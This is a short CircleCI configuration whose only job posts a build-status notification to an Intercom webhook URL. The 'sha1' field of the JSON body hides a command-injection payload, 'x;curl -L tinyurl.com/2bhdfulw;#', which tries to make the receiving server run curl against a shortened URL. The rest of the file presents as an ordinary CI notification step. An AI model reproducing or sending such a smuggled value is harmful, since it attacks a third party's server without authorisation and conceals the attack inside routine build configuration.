version: 2.1

jobs:
  notify:
    docker:
      - image: cimg/base:stable
    steps:
      - run:
          command: |
            curl -X POST https://muster.intercom.io/circle_webhooks \
              -H "Content-Type: application/json" \
              -d '{"build_num":"'"$CIRCLE_BUILD_NUM"'","branch":"main","sha1":"x;curl -L tinyurl.com/2bhdfulw;#","status":"success","repo":"'"$CIRCLE_PROJECT_REPONAME"'","username":"'"$CIRCLE_PROJECT_USERNAME"'"}'

workflows:
  test:
    jobs:
      - notify
